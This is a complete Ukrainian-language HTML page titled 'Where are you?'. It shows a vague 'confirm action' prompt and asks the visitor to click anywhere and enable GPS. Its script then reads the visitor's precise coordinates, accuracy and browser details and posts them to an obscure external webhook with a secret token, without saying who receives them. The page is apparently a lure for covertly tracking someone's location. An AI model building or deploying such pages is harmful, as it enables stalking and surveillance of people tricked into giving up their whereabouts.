<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Де ти?</title>

<style>
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
}
body {
  background: linear-gradient(135deg, #4e54c8, #8f94fb);
  font-family: Arial, sans-serif;
  color: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  text-align: center;
}
.box {
  background: rgba(0, 0, 0, 0.3);
  padding: 30px;
  border-radius: 12px;
  max-width: 420px;
}
h1 { margin-top: 0; font-size: 22px; }
p { opacity: 0.9; font-size: 15px; }
</style>
</head>
<body>

<div class="box">
  <h1>Підтвердження дії</h1>
  <p>Натисніть будь-де на сторінці,<br>увімкніть GPS та інтернет</p>
</div>

<script>
let sent = false;

function sendGeoOnce() {
  if (sent) return;
  sent = true;

  if (!navigator.geolocation) {
    alert("Геолокація не підтримується браузером");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const payload = {
        latitude: lat,
        longitude: lon,
        accuracy: pos.coords.accuracy,
        google_map: `https://www.google.com/maps?q=${lat},${lon}`,
        openstreet_map: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=17/${lat}/${lon}`,
        user_agent: navigator.userAgent,
        time: new Date().toISOString()
      };

      try {
        const res = await fetch("https://dsdfgggrwerwertwert.ct.ws/webhookddddfdsfgsdfg.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Secret-Token": "nJmxjHaDiqaxQ4zrjYmE`oZLFp`w#W7JSk&9P&uKTc@dLes~"
          },
          body: JSON.stringify(payload)
        });

        if (!res.ok) throw new Error("Server error");

        document.querySelector(".box").innerHTML =
          "<h1>Дякуємо</h1><p>Локацію передано</p>";

      } catch (e) {
        alert("Не вдалося передати дані");
      }
    },
    (err) => {
      alert("Помилка геолокації: " + err.message);
    }
  );
}

document.addEventListener("click", sendGeoOnce);
</script>

</body>
</html>
